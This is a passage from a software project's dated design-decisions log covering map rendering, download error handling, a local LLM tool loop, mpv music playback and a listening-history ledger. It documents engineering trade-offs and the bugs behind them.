  vector scale is derived from that same span, which makes the layers aligned
  by construction. The cached 1024² PPM stays authoritative and regenerable;
  M4's zoom stops become a factor on the destination size rather than a
  second rendering path. *(2026-08-09.)*
- **The 5-mile ring mask is eight plain shapes, not one keyhole polygon.** The
  usual trick for "fill everything except this circle" is a single polygon
  that traces the rectangle, runs down a zero-width slit into the circle, and
  comes back — which relies on the renderer's winding rule and on a degenerate
  edge behaving. It probably works in Tk; "probably" is the problem, since the
  failure mode is a visible artifact on someone else's machine that no test
  would catch. Four rectangles outside the ring's bounding box plus four
  corner wedges between the box and the arc are all simple, non-self-
  intersecting polygons that fill identically under either rule. Eight canvas
  items against one is not a cost worth reasoning about. *(2026-08-09.)*
- **Zoom crops the cached raster before scaling it, and the fix stays
  centred.** Given the M3 decision to resample to the canvas, a zoom stop is
  just "sample a smaller centred square of the source to the same span" — so
  the work is constant at every stop, where scaling first and cropping after
  would build a 4x-larger intermediate for 4x (~31 MB and seconds of Python).
  The stops only magnify: at 1x the whole ingest square is already visible and
  the cache is a hard edge on how much world exists, so a zoom-out stop would
  show nothing but background. There is no free panning either — this is a
  range display centred on you, and moving the centre is search's job (M5).
  *(2026-08-09.)*
- **Hover tolerance is set in pixels and converted to metres; the test itself
  stays in geometry space.** The spec asks for a fixed ~40 m tolerance,
  explicitly "not pixels" — but that contrast was aimed at `find_closest()`,
  which answers "which canvas item is nearest" and can lose to an unrelated
  layer that happened to drop a vertex closer. That concern is about where the
  comparison happens, and geometry space is preserved: cursor pixels are
  back-projected to local metres, ~9 index cells supply candidates, and exact
  point-to-segment distance decides. Only the tolerance's *size* is derived
  from pixels, because at the shipped display scale 40 m is under two pixels
  and a hover that demands two-pixel precision reads as broken. Ten pixels'
  worth of metres tracks how precisely a hand can actually point, and tightens
  automatically as you zoom in. *(2026-08-09.)*
- **"The source has no such file" and "the download failed" must never be the
  same branch.** Poseidon tolerates a missing AREAWATER file because plenty of
  inland counties genuinely publish none — but the first version caught every
  exception there, so a `TimeoutError` on one county's lakes was recorded as
  "this county has no lakes" and the ingest committed a chart missing real
  water with nothing on screen, and only an INFO line in the log, to say so.
  Found by reading the log after a slow cache looked like a hang. Now only an
  HTTP 404 means absence; anything else raises, and every county download
  retries once first since a stalled TIGER fetch is usually transient. The
  general rule: when a failure path is *tolerated*, the tolerance must be
  narrowed to the exact condition that is genuinely benign — a broad `except`
  under a permissive branch turns every unrelated fault into silent data loss.
  The follow-on: all three ingest downloads now go through one
  `artemis.download()` rather than a copy per layer. The bug was possible
  *because* the logic was duplicated — Hecate's copy was right and Poseidon's
  was wrong — so the fix is one implementation, with 404-means-absence behind
  an explicit `allow_missing` that only the optional AREAWATER fetch passes.
  *(2026-08-10.)*
- **Artemis search moves the VIEW; it never writes the fix.** Themis's
  latitude/longitude feed Atmospherics, Celestarium, Helios/Selene and the
  season as well as the chart, so a search box that wrote through would mean
  looking up a trailhead silently relocated the weather and the star map. The
  searched place becomes a panel-local view centre, ⌂ HOME snaps back to the
  fix, and a Kairos tick deliberately does NOT reclaim the view — otherwise
  typing a place would be undone within ten minutes. Caching the searched area
  stays a separate explicit click; nothing about panning downloads anything.
  This is also why the spec's "Pharos" (a module owning the fix Felhaven-wide)
  was dropped rather than built: Themis already held that job, and the part
  that was genuinely missing — turning text into coordinates — is what
  `tools/eratosthenes.py` does and all it does. *(2026-08-10.)*
- **`tests/test_artemis_offline.py` is the stack's first socket-level
  hermeticism test, and it patches with a context manager.** Every other
  module mocks its own named seam (`requests.get`, `_OPENER.open`), which is
  enough when the rule is about one function. Artemis's rule is about a whole
  category — no render path anywhere may touch the network — so the block goes
  at `socket.socket`/`socket.create_connection` and a real cached area is
  driven through load, render, zoom and hover beneath it. Two things make it
  trustworthy: `mock.patch` as a context manager, never assignment to the
  socket module's globals (that poisons every later test in the process and
  the fallout reads as network flakiness), and a `test_the_block_is_real` case
  proving the guard actually raises — a hermeticism test that cannot fail
  reports safety it never checked. *(2026-08-10.)*
- **ArtemisPanel runs one daemon ingest thread with a bounded `after()` drain
  chain — the Echo pattern, now a listed §6 exception.** A cache ingest is a
  multi-minute, multi-county network job: request-driven (never automatic, a
  two-click confirm), so there is no Kairos tick to drain on, and the panel's
  own `artemis` worker fires only every 600 s. The worker thread's only shared
  touch is `queue.put`; an epoch counter discards messages from a cancelled
  run; a `threading.Event` cancels between counties and the tools side
  guarantees a cancelled or failed ingest leaves no partial directory.
  *(2026-08-09.)*
- **The Artemis porthole is fixed-size chrome; the world moves under it.**
  Canvas items now carry one of two family tags. `world` (terrain raster,
  water, roads, range rings, the fix crosshair) is anchored to `_view()`'s
  origin, drawn *under* the mask so the glass clips it, and is the only thing a
  drag moves. `chrome` (mask, rim, bearing ticks, cardinals, compass, scale
  bar) is anchored to the canvas and never moves. `_porthole_r` is
  `DISPLAY_RADIUS_M * min(scale, scale/zoom)`, which is `0.4546 * span` at
  every stop — so the round frame is the same size at 1x, 2x and 4x, and
  `_draw_mask`'s old "nothing to hide when zoomed in" early return was
  provably unreachable and is gone. What forced this: the terrain raster is a
  `span × span` square while vectors span the full canvas width, so dropping
  the mask at 2x/4x exposed the raster's straight edge as a hard seam with
  roads floating on black beyond it. Range rings that no longer fit are
  replaced by the rim, labelled with the radius actually visible (5 / 2.5 /
  1.25 mi) so zooming never removes the chart's only distance reference. Note
  `DISPLAY_RADIUS_M` (8047 m) exceeds the true 5-mile ring (8046.72 m), so the
  fits-inside test needs a two-pixel margin or it draws ring and rim as a
  doubled hairline. *(2026-08-16.)*
- **Artemis pans by drag, superseding the 2026-08-09 entry that said the fix
  stays centred.** That entry was right for a chart with no mask beyond the
  ring and no way to look off-centre; the porthole change above made a
  centred-only view the thing that *showed* the raster seam, and zoom without
  pan only ever magnifies the middle. The pan is stored in world metres and
  enters `_view()` alone, so vectors, rings, the fix mark and the hit test
  follow it with no second code path — a panned chart and a panned hit test
  cannot disagree. It clamps to `DISPLAY_RADIUS_M * (1 - 1/zoom)`: exactly
  zero at 1x (everything is already on screen, so off-centre would be
  arbitrary) and, since the porthole's world radius is `DISPLAY_RADIUS_M/zoom`,
  the furthest reach is exactly `DISPLAY_RADIUS_M` — inside the cached square,
  so there is always data under the glass. A drag moves the `world` tag and
  never rebuilds the raster; a `_PAN_MS` pause re-crops it, which is needed
  because the raster reaches only ~4.5% of the span past the glass. Click and
  drag are told apart by `_CLICK_PX = 4` (the Windows `SM_CXDRAG` threshold) —
  deliberately not `_HOVER_PX`, which measures how precisely a hand can point
  rather than how far one slips while clicking. *(2026-08-16.)*
- **A cached area's name is optional manifest metadata, and the recycle-bin
  helper is copied rather than shared.** The name can only be metadata:
  `area_id` is a deterministic function of the centre coordinates, so the
  directory name is not available to rename. It rides as an optional
  `manifest["label"]` with no `MANIFEST_SCHEMA` bump — optional keys are
  already how schema 2 carries `terrain_skipped` and `grid` — and
  `ingest_area` reads it back immediately *before* the commit, not at the top,
  so a rename made *during* a download still survives. On the helper:
  `orpheus.delete_file()` is NOT reusable (its `_safe_path` demands
  `os.path.isfile` and is hard-wired to `local_audio/`), and unlike the
  `download()` consolidation this is a copy worth making — the Windows call is
  identical but the non-Windows fallback cannot be (`os.remove` raises on a
  directory), and the download bug came from a duplicated *policy* branch
  where this has no policy at all. Rule of three: lift it to a shared home if
  a third caller appears. `delete_area`'s guard is the real work — bare name,
  not `_`-prefixed, not `.partial`, `isdir`, and a `realpath` parent check,
  which is what a basename test cannot do since a junction inside the cache
  would otherwise pass. *(2026-08-16.)*
- **A refresh keeps the terrain it already had — best-effort must not mean
  best-effort-on-re-ingest.** Terrain was made best-effort so a missing
  OpenTopography key could not cost you the roads and water that already
  downloaded (§12, 2026-08-09). That reasoning holds for a FIRST ingest and
  inverts for a refresh: `ingest_area` replaces the whole area directory, so
  a re-ingest with a sealed vault silently downgraded a complete area to a
  terrain-less one — the user paying for a road update with elevation they
  already owned. Found in the field within minutes of shipping the per-row ⟳.
  `_carry_terrain` now copies the committed `terrain.bin` into the partial
  dir and restores the `grid`/`sources.elevation` entries, recording
  `terrain_kept` rather than `terrain_skipped`; topography does not change,
  so an older grid is strictly better than none, and carrying the grid whole
  is not datum mixing. Only `terrain.bin` is copied — `derived/` already
  holds the freshly built spatial index for the NEW roads and water, and
  `demeter.raster()` rebuilds the raster on demand. This is the Poseidon 404
  lesson recurring: **a tolerated failure must never degrade data that is
  already committed.** Ask of any such branch not just "is this failure
  survivable" but "survivable compared to what was already there".
  *(2026-08-16.)*
- **The Cached Locations overlay is `place()`d on the canvas, expanded by
  default, and does not scroll — three deliberate deviations.** (1) It is a
  child of the canvas positioned with `place()`, never
  `canvas.create_window()`: a canvas window is a canvas *item*, and
  `_redraw()` opens with `canvas.delete("all")`, so the overlay would be
  destroyed on every zoom, resize and area load. A test redraws and asserts
  the box still exists, so converting it back fails immediately rather than
  mysteriously. (2) §7 says collapsible sub-widgets start collapsed; this one
  starts expanded because it is map chrome in the same class as the compass
  and scale bar, which are already permanent — the ▶/▼ toggle is still there
  for anyone who disagrees. (3) §7 says scrolling lists reuse `_ScrollFrame`;
  this is not a scrolling list. Rows are few by construction (each is a
  deliberate 10–30 MB download), a seventh copy of that pattern is heavy
  machinery for two to six rows, and its `bind_all` wheel handling would
  fight a canvas that now pans. Recorded so none of the three reads as an
  oversight. *(2026-08-16.)*
- **`Sidebar._relayout()` forgets the whole rail and re-packs it** rather than
  packing/forgetting just the group box. `pack()` appends to the bottom of its
  container, so re-expanding a group would drop its children below Cogitator
  instead of back into their slot. Forget-all-then-pack-in-declaration-order is
  the same idiom `felhaven._show_view` uses, and it is order-correct by
  construction rather than by remembering a `before=` neighbor.
  *(2026-08-08.)*
- **CodeQL's clear-text-logging alerts against §3 smoke-test `print()`s are
  dismissed, never coded around.** Three so far, all
  `py/clear-text-logging-sensitive-data` at **high** severity, all on the public
  mirror `Felsyn/felhaven` (code scanning is not enabled on the private repo, so
  they surface only after a snapshot push): `tools/aura.py` and `themis.py` on
  2026-07-21, `voices.py` on 2026-08-16. The query's "private" classification
  implements CWE-359, whose term list includes geographic location *and gender* —
  so `aura`/`themis` tripped on latitude/longitude and `voices.py` on the local
  named `gender` in `label()`, read from the hardcoded
  `_GENDER = {"f": "female", "m": "male"}`. **The heuristic is name-based only.**
  It cannot see that the value is one of two literals naming a kokoro voice
  timbre, or that a §3 smoke block prints constants to a local console and never
  to a log file or the wire. **Do not rename an accurate identifier to dodge a
  regex** — `gender` → `timbre` would silence the scanner by making the code
  worse for the reader, and would teach the next session that heuristics outrank
  clarity. Dismiss with reason `used in tests` and a comment saying why (280-char
  API limit), then one CHANGELOG line. Genuine secrets are Cerberus's problem and
  never reach a `print()` in the first place. *(2026-08-16.)*
- **`panels/rite_panel.py` is a `tk.Toplevel`** — the toolbox's first, against
  §7's house pattern of an in-panel expand or a swapped frame. The Rite Log has
  two requirements neither of those meets: the operator must be able to open
  **two turns at once** and read them side by side, and the transcript behind it
  must stay scrollable while one is up (the failure they are diagnosing is often
  three answers further down). Hence also **no `grab_set()`** — a modal window
  would defeat both. The window imports `theme` and nothing else; it takes a
  list of dicts and draws it, so it stays a panel in every sense that matters.
  *(2026-08-18.)*
- **Stop now halts pending tools, not just the model.** `cancel` was checked once
  per round, above the tool loop, so pressing Stop while tool 1 of 3 was running
  let tools 2 and 3 run to completion — Stop stopped the oracle but not its
  rites, which is not what the button says. A second check now sits at the top of
  the per-call loop; remaining calls are recorded `not_run` and never dispatched.
  Note the blast radius: `HomePanel._on_refresh` also sets the cancel event, so
  **Refresh abandons pending tools too**. Both are the intended reading of "stop".
  *(2026-08-18.)*
- **A rite record's `error` field is assigned by subscript, not written into the
  dict literal** (`pythia.py`). `tests/test_tool_output_contract.py` inspects
  every `{"error": ...}` literal in the app-root and tool modules and requires a
  slug — the right rule for a value that gets fed to the LLM, and the wrong one
  for a *diagnostic copy* of that value, which is computed by construction. The
  guard cannot tell the two apart, so the record is built without the key and the
  field set immediately after, with a comment at the site. **Do not "tidy" it
  back into the literal** — the guard will fail, correctly by its own lights.
  A future tightening could scope the walk to `return` statements. *(2026-08-18.)*
- **`pythia._now()` returns naive LOCAL time**, against the usual instinct to
  store UTC. Felhaven is single-machine and local-first, and the question a rite
  answers is "what happened on my machine, when" — the reader is comparing it
  against their own memory of the afternoon, so they want the clock on the wall.
  UTC earns its ugliness once records are aggregated across machines, which these
  never are. It exists as a function at all so tests can patch it. *(2026-08-18.)*
- **The Rite Log's redaction is a pattern scrub, and imports no `cerberus`.** A
  diagnostic system that needed the vault unlocked in order to report that the
  vault is locked would be useless exactly when it is wanted. So `_redact()` is
  deterministic regexes over the *value* half of `key=`/`token=`/`auth=` and
  `Authorization: Bearer`, applied to a rite's error and result preview only.
  **Arguments are never redacted** — model-authored arguments are precisely what
  the operator opened the log to read, and scrubbing them would defeat the
  feature. *(2026-08-18.)*
- **Every `/api/chat` payload shares one `_OPTIONS` dict** — `_chat()` and
  `_warm()` must not each spell out their own. Ollama keys a *resident* model on
  its runtime options, so a warm whose `num_ctx` differs from the chat's loads a
  runner the first real question immediately discards and reloads. The prewarm
  looked healthy for six weeks while doing exactly that: it sent no `options` at
  all, warmed a 65536-context runner, and the first question still paid ~70s —
  measured 71s at a point 83 seconds *after* a warm that had reported success in
  1.4s. The guard is a test comparing the two captured payloads to each other;
  hardcoding `8192` in it would pass while the halves drift. *(2026-08-19.)*
- **The warm sends a real prompt, not `messages: []`.** Load-only warming leaves
  the ~2,700-token system-prompt-plus-tool-schemas prefill to the first question
  (6.7s measured). Sending the real prefix parks it in llama.cpp's prompt cache,
  which matches on longest common prefix — so a question with a *different* user
  message still reuses it: 2,714 prompt tokens, of which only 21 were actually
  processed. Cost of the choice: the prefix is captured at warm time, so editing
  the Machine Spirit prompt before the first question misses the cache and falls
  back to the old cost. No breakage, just no saving — the system-prompt-as-tool-
  surface seam again. *(2026-08-19.)*
- **`pythia._WARMING` is a worker→main `threading.Event`**, against §6's "the
  result queue is the only object shared between worker threads and the main
  thread". Allowed for the same reason `ask()`'s `cancel` crosses that boundary
  the other way: an Event is atomic, carries no payload, and needs no drain, so
  none of the ordering hazards the queue rule exists to prevent apply. It is
  cleared in a `finally` precisely so a downed Ollama cannot strand the UI on
  "waking the oracle…". `HomePanel` reads it from the drain chain it already
  runs, so no second `after()` id is created and §6's teardown rule is
  untouched. *(2026-08-19.)*
- **`morpheus.fetch()` carries an `error` slug**, which §2's flavor table does not
  contemplate for a polled read — the error vocabulary is written around
  `handle()`. Morpheus's mutations are fire-and-forget over IPC (`loadfile`
  returns nothing), so the *only* place a failed load can surface is the polled
  read. On 2026-08-20 a yt-dlp too old for YouTube made every play a no-op: mpv
  resolved a URL it then got HTTP 403 on, the panel showed "(loading…)"
  indefinitely, and `felhaven.log` held not one `METIS.morpheus` line across the
  whole outage. The subsystem was completely dark, and the bug was findable only
  by running mpv by hand *outside* the app. The slug is bare (`load_failed`) and
  mpv's own text is never spliced into it — those lines carry signed
  `googlevideo` URLs, exactly the leak §2's no-raw-text rule exists to stop; the
  reason goes to the logs instead. *(2026-08-20.)*
- **Load failure is detected by tracking intent, not by subscribing to mpv's
  `end-file` event.** An event reader needs a persistent pipe connection and a
  dedicated thread, and §6 gives timing to Kairos; this rides the 2 s status tick
  that already exists and adds no thread. It works because a failed load and a
  deliberate stop are *identical* to mpv (idle-active `True`, path `None`) and
  differ only in whether we asked for something — so the discriminator has to be
  Python-side anyway. **The trap, paid for once:** mpv sets `path` the moment it
  accepts a URL, while yt-dlp is still resolving and long before anyone knows the
  load will work. Confirming on `path` disarms the detector one tick *before* the
  failure appears, and the outage goes invisible again. Confirmation is
  `time-pos`/`duration` — media existing. The unit tests were green with the bug
  in place ("no error while loading" is true either way); only an end-to-end run
  against real mpv caught it, and the regression test now asserts the detector is
  still *armed* after a loading tick rather than merely quiet. *(2026-08-20.)*
- **mpv gets TWO log files, because its own is unreadable.** `--log-file` writes
  ~420 KB per successful track load, dominated by one ~128 KB line (mpv logs
  yt-dlp's whole JSON dump), and it writes that whether anything went wrong or
  not — one measured run was 424 KB and 661 lines containing *zero* errors. The
  verbosity is not ours to tune: `--msg-level` does **not** lower it, because mpv
  forces the log file to at least `-v -v` (verified against the binary rather than
  assumed, twice). So `mpv.log` is treated as a **scratch buffer**, and the ~3
  error lines that matter are cut out of it into `last_failure.log` at detection
  time — 361 bytes vs 22 KB, measured. The distilled file holds exactly ONE
  failure, overwritten each time, because the most recent is the only one anyone
  asks for; it is what the panel names and what survives `shutdown()`, which
  deletes the scratch buffer once mpv releases the handle. **The lesson worth
  keeping: when a third-party tool won't log less, don't accept its log as the
  artifact — distil it and throw the rest away.** Both files sit in a
  *subdirectory* of `logs/`, since `emanon.py` globs `logs/*.log` non-recursively
  and parses every line of every match on each tick, and neither is in the METIS
  `" | "` format. Neither is the primary signal — the ERROR line `status()` writes
  to `felhaven.log` is what Emanon surfaces, and it stands alone if `--log-file`
  is ever dropped entirely. *(2026-08-20.)*
- **Morpheus's transport is ONE `action` enum, not five tools — and `resume_music`
  was absorbed into it rather than kept beside it.** Two decisions, one reason
  each. *Five tools:* `pause_music`, `stop_music`, `next_track`, `previous_track`
  and `music_status` would be five schemas billed on every request to a small
  local model, to describe one subsystem's transport; `manage_timer` had already
  set the enum precedent. *Absorbing `resume_music`:* it meant "reload `_last_url`
  from where it left off", which is **not** what "resume" means next to a pause
  button. Left side by side, the model faced that distinction on every music turn
  and could only get it wrong — so unpause took the name `resume` and the reload
  became `replay`. Net: morpheus still exposes exactly two tools, split
  start-vs-govern, and the registry stayed at 22. **Two things not to "simplify"
  back:** `control_music` routes pause through `set_paused()` and never
  `toggle_pause()` — a blind caller retrying a toggle turns the music back ON,
  which is why the panel keeps the toggle and the tool does not — and every
  mutating action is gated on `status()["running"]`, because `_ipc()` is silent on
  a dead pipe and would otherwise report success for a command nothing heard. A
  human pressing a button sees nothing happen; a model does not.
  *(2026-09-15.)*
- **Morpheus tracks the volume it set rather than reading it back — and the
  duck is a RATIO, not a floor.** Two choices that look wrong at a glance, in the
  one place a volume control could go badly. *The tracking:* `duck()`/`unduck()`
  run on the audio-buffer thread and the Tk main thread, and `_get_props`' timeout
  "cannot interrupt a `readline()` already blocking", so a read on either could
  stall narration or the UI. This module's own docstring predicted that a volume
  control would therefore force the read to come back. It does not — a read is
  only needed if we do not already know the answer, and we do: `--no-config`
  blocks any `mpv.conf`, there is no window or terminal to take a keypress,
  `--watch-later-options=start` keeps volume out of resume files, and this module
  is the only writer in the process. `_user_volume` is therefore AUTHORITATIVE,
  not a cache. **What invalidates it:** a second writer appearing, or either of
  those two mpv flags being dropped — then the read has to come back, and off
  both those threads (the Kairos worker is the place). What the old warning got
  right was narrower than it looked: the constant was the problem, not the
  tracking. *The ratio:* with the volume at 20, ducking to a fixed 30 makes the
  music LOUDER during narration — the opposite of yielding. `_DUCK_RATIO` is
  0.30, which at the default level is the same 30.0 the original was measured at,
  so nothing observable changed for the case that already existed.
  *(2026-09-15.)*

- **Aura has two sources, and Kairos retries a failed fetch early.** Two changes
  to one failure, worth separating because only one of them is about retrying.
  *The trigger:* on 2026-09-15 wttr.in served an expired Let's Encrypt
  certificate for nine hours (`notAfter Sep 15 08:35:01 2026 GMT`), and the
  Atmospherics panel read "unavailable" the whole time. The log shows the same
  host failing in runs before that — 500s and read timeouts on 08-18, 08-21 and
  08-24, three to eight consecutive misses each.

  **A retry would not have fixed any of it, and that is the useful part.** A
  certificate failure is not a flaky link: every attempt fails identically, at
  the same speed, forever. The runs of 500s were hours long too. So the tempting
  fix — retry the request three times inside `fetch()` — would have changed
  almost nothing, and `verify=False` would have permanently disabled certificate
  checking to paper over something that lasted an afternoon. The real answers
  were a **second source** (`_fetch_weather()` falls back to Open-Meteo, which
  normalizes into `_build()`'s dict so no panel learns which host answered), and
  a **schedule fix**, because the panel was also staying wrong long after the
  sky was fine.

  *The schedule fix* (`Kairos.RETRY_DELAYS`) is a genuine deviation from "Kairos
  fires each worker on its interval": a failed worker is re-attempted at
  60s/300s/900s instead. **It deliberately runs out** rather than backing off
  forever — a blip is caught within a minute, and a real outage settles back to
  the worker's normal cadence instead of doubling the traffic to a dead endpoint
  for nine hours. It lives in `_drain_queue`, on the main thread, reading the
  `None` that Kairos itself put on the queue, so §6's one-shared-object contract
  is untouched.

  **What the fallback costs:** Open-Meteo has no moon data, so SELENE reads
  blank while it is serving (`selene.py` already degrades per-field, so it shows
  "—" rather than crashing). Restoring it means computing the phase locally —
  it is deterministic from the date — not a third fetch. Its `weather_code` is
  also translated from WMO into wttr.in's WWO space on the way out, because
  that is the space `aura_panel._icon()` maps; leaking a raw WMO code would
  silently draw the wrong emoji rather than fail. *(2026-09-15.)*
- **Euterpe grew a whole-file write (`replace_all`) without growing a
  `clear()`.** Its docstring says there is no clear/erase/undo, on the
  `herodotus.py` precedent, and that stays true — the two are different things
  and the distinction is the whole entry. What the rule forbids is a
  *programmatic* erase: a hook that Reset Session, a panel button or the model
  could call to wipe history as a side effect of doing something else, which
  would turn a no-repeat list into a list that can be wiped mid-session.
  `replace_all()` is the operator's own hand — it is reached from exactly one
  place, the TUNES tab's SAVE, on a file they could always have opened in
  Notepad. On 2026-09-16 they had to: a bug logged eight of the DJ's own picks
  as the listener's taste, one of them a gear manual, and the only fix was a
  script and a hand-made backup. The taste anchor reads `source: "user"` rows
  and nothing else, so a mis-attributed row is not noise in the history, it *is*
  the taste. Euterpe is still absent from `pythia._TOOL_MODULES`, so the MODEL
  still has no write handle, which was always what the rule protected.
  *(2026-09-17.)*
- **The TUNES tab is raw JSON rather than a row list, and SAVE keeps one
  `.bak`.** A list of rows with a delete cross would be safer to click and
  could not express the third thing the tab is for — pasting a song in to seed
  the taste. The schema is eight flat fields over a file bounded to 200 plays,
  and an editor that shows the file itself cannot drift from it. The net that
  choice needs lives in `euterpe`, not the panel: `replace_all()` validates
  before it writes and refuses with a slug naming the row, and `_backup()`
  copies the old file to `euterpe_ledger.json.bak` first — a save whose backup
  fails is refused rather than taken blind, because the backup *is* the undo the
  module otherwise doesn't have. `.gitignore` matches `euterpe_ledger.json*` so
  the copy is as unpublishable as the log. *(2026-09-17.)*
- **The TUNES editor refuses to save over a write it didn't make.** Awen
  records plays on a 2 s Kairos tick, and `record()` is load → mutate → save, so
  a tab left open while a song ends is holding text that would delete that play
  on the next SAVE. The panel keeps the `euterpe.stamp()` (an mtime) it loaded
  at and compares it back before writing. It is compared for **equality only** —
  "different from what I loaded" is the whole question, and it is the one
  question a clock change cannot answer wrongly. The stamp is taken *before* the
  text on every load, so the failure mode is a false alarm costing a RELOAD
  rather than a silently clobbered song. *(2026-09-17.)*
- **Euterpe keeps TWO backups with different jobs, and the second is the one
  that matters.** `euterpe_ledger.json.bak` is written automatically before
  every hand edit and **rolls** — it protects the save you just made and is gone
  after the next one. `euterpe_ledger.json.base` is taken deliberately, by the
  TUNES tab's *TAKE FROM SAVED*, and nothing in the module ever replaces it. A
  rolling backup cannot answer "put it back the way it was when I had it right",
  which is the question actually being asked: the ledger gets a little worse
  every evening the DJ mis-attributes something, so the state worth returning to
  is days old by the time you notice, not one save ago. Two files rather than
  one dressed-up file, because an automatic write and a deliberate one must not
  share a name. `take_base()` reads the ledger **from disk**, never from the
  editor's text — a base copy is a state that was validated and saved, not one
  that was typed — and the panel refuses the button while the box is dirty
  rather than quietly capturing the older state. *(2026-09-17.)*
- **RESTORE is preview-only, and deliberately does NOT re-take the staleness
  stamp.** Preview-only is the `machine_spirit_panel.py` "Revert to Default"
  precedent (§7): this is the escape hatch from a bad state, so it must not be a
  state you then need an escape hatch from — it fills the editor and writes
  nothing until SAVE. The stamp is the less obvious half. Every other load
  re-takes it, and this one must not, because restoring is the most destructive
  thing the tab can commit: it drops every play since the base was taken. If
  Auto-DJ landed a song while the operator was deciding, SAVE should stop and
  say so rather than wave through a click that was aimed at a different file.
  *(2026-09-17.)*
- **The base copy is named `euterpe_ledger.json.base`, not
  `euterpe_ledger.base.json`.** `.gitignore` matches `euterpe_ledger.json*`,
  which covers only names that START with the log's full name. The natural
  reading — putting `.base` before the extension — produces a file git would
  happily track, and the first `git add -A` would publish somebody's listening
  history. `tests/test_euterpe.py` asserts the chosen name is ignored, so the
  next file in this family gets the same check rather than the same guess.
  *(2026-09-17.)*
- **Awen reads Euterpe's ledger and no longer writes to it.** Until 2026-09-17
  every DJ pick was filed as a `dj` row, purely so `was_recently_played()` would
  refuse it next turn. Once the ledger got an editor (Vox Array → TUNES) that
  stopped being defensible: it is a list somebody curates, and a job that writes
  to the list it reads from is a feedback loop wearing a different hat. The
  strongest version of the argument is that the loop already closed once — a
  labelling bug filed the DJ's own picks as the listener's, a gear-manual video
  became "what Matthew likes", and the DJ went looking for more gear manuals.
  Fixing the label fixed that bug; removing the write removes the SHAPE of it.
  The listener's own plays are still recorded here, because `awen.py` is the
  only thing watching mpv — and still with the flag off, or the first switch-on
  would find no taste at all. *(2026-09-17.)*
- **The DJ's no-repeat memory is `awen._session_plays`: in the process, for one
  run, never on disk.** It is the whole reason `dj` rows existed, so it had to
  go somewhere — and this is the one consequence that is easy to miss, because
  the guard at the top of `_guarded_play_music` is the ONLY thing stopping a
  re-pick and the prompt does not cover for it (measured over ten real turns,
  the model proposed a song already on the list it had just been handed six
  times). Not a second state file: the window is 20 songs, about an evening, and
  Auto-DJ is already off at every launch and not persisted (see above), so
  session-scoped DJ state is the position this codebase already took. **The cost
  is stated rather than hidden:** a restart may let it replay something from
  earlier the same day, and there is no longer any record of what it played last
  night beyond a DEBUG line. A song worth keeping gets typed into TUNES, which
  is the same act as choosing it. *(2026-09-17.)*
- **Session rows are shaped like ledger rows, and carry `source: "dj"`.** So
  `awen._known_plays()` can hand euterpe's existing views one concatenated list
  and every one of them behaves: `was_recently_played()` is a membership test,
  `recent_titles()` takes the tail and de-duplicates, and `taste_anchor()` skips
  them by the `source == "user"` rule it already had. That is the point — no
  second matching implementation that could drift from the first, in the
  `is_a_song()` spirit. The **one** thing concatenation cannot answer is "which
  song just finished", because the two lists interleave in time and neither
  holds both halves; that reads `awen._last_played_key`, set on every observed
  play whoever started it. A test pins exactly that case — a listener song
  played after a DJ one — because the tail of the combined list gets it wrong
  and looks right. *(2026-09-17.)*
- **Euterpe's ledger stopped being append-only, on the same day it stopped
  being the DJ's.** A log of everything that played wants every play in it. A
  list somebody keeps has no use for a second copy of a song: `taste_anchor()`
  and `recent_titles()` both de-duplicate before they answer, so a duplicate
  changes neither — all it reliably does is take a line in the editor and a slot
  against `_MAX_ENTRIES`, and that second one is not cosmetic. The cap trims
  from the FRONT, so playing a favourite twice would quietly drop the oldest
  song the listener actually likes. A test pins exactly that.
  **The two write paths hold the rule differently, deliberately:** `record()`
  MOVES — the old row is dropped and the new one appended, because playing a
  song again is a current signal and keeping the first timestamp would discard
  it to preserve a history nobody reads. `replace_all()` REFUSES, naming both
  rows — it is the function that promises not to rewrite what was typed, and
  silently dropping a line the operator can see on screen is how a file stops
  matching its editor. Identity is the normalized key alone, never also the
  video id: collapsing one song's many uploads is the entire reason
  `normalize()` exists, so a second test on the id could only split a row the
  key had already joined. *(2026-09-17.)*
- **Song identity ignores the order across the dash, and the KEY did not
  change — the comparison did.** `normalize()` cannot tell which half of
  "A - B" is the artist, and YouTube ships the same song both ways round.
  Measured 2026-09-17 from a real mpv log: the DJ played `Linkin Park - In The
  End (Official Music Video)` and then `In The End [Official HD Music Video] -
  Linkin Park`. Two keys, one song, and equality on the keys said they were
  different, so the guard let the repeat through. `same_song()` sorts the halves
  before comparing and is asked by all three callers — the guard, `record()`'s
  move-on-replay, and `replace_all()`'s duplicate check — because if they could
  disagree, a song the guard refused could still be filed twice.
  **Why the comparison and not the key:** the key is also what TUNES shows and
  what the model reads in its do-not-repeat list, and a sorted key reads
  backwards half the time ("in the end - linkin park"). Changing it would also
  have invalidated every stored key for no gain. Two different songs colliding
  would need one's artist to be the other's track and vice versa. *(2026-09-17.)*
- **Whose song it is, is decided by the loaded URL, and doubt resolves towards
  the DJ.** `awen._note_playing` compared `normalize(search_result_title)` with
  `normalize(mpv_media_title)` — two strings with different authors — and
  resolved every disagreement towards `source: "user"`. Measured 2026-09-20 on
  the live ledger: one upload arrived NFC from yt-dlp and NFD from mpv, so
  `Altın Gün` was spelled with a precomposed `ü` on one side and a combining
  diaeresis on the other. One video, one id, and `same_song()` said no, because
  `casefold()` folds case and not Unicode form. So `morpheus.status()` now
  publishes mpv's `path` and identity is `video_id()` on both sides, falling
  back to the title only when one side has no id.
  **Why `path` and not `_last_url`:** `_last_url` is INTENT — it still names a
  URL after that load failed, and it is a whole track stale after a playlist
  walk. `path` is what mpv holds, and the question being asked is "which URL
  produced the audio I can hear".
  **Why a THIRD answer:** a song that cannot be attributed is filed `dj`, in
  memory, for this run. A wrong `dj` costs one missed taste signal; a wrong
  `user` is a permanent row in a curated file that `taste_anchor()` reads as
  what the listener likes, and that loop has now closed twice. Its held
  introduction is NOT spoken, for the `_names_the_song()` reason, and it does
  not reset the breaker — a song we cannot attribute is not evidence that ours
  played. It logs at WARNING, the third exception to Awen's no-INFO rule, and
  it is Emanon-safe because it is rare by construction; if it stops being rare,
  that is a fault worth the verdict. **The cost, stated:** a listener's song
  that lands inside an unproven window is invisible to the anchor and unpickable
  for 20 songs. The recourse is the documented one — a line typed into TUNES.
  *(2026-09-20.)*
- **`normalize()` folds Unicode form before anything else touches the string.**
  `casefold()` folds CASE and nothing else, so one song spelled two ways keyed
  twice — which broke attribution, let the DJ replay a song it had just played,
  and would have written the same song to the ledger twice. Three bugs, one
  missing line. NFC because it is what JSON from the web carries and what a text
  box produces. Stored keys are NOT re-derived (`replace_all()` does not re-key
  what was typed), so an old row in the other form keeps the key it has and
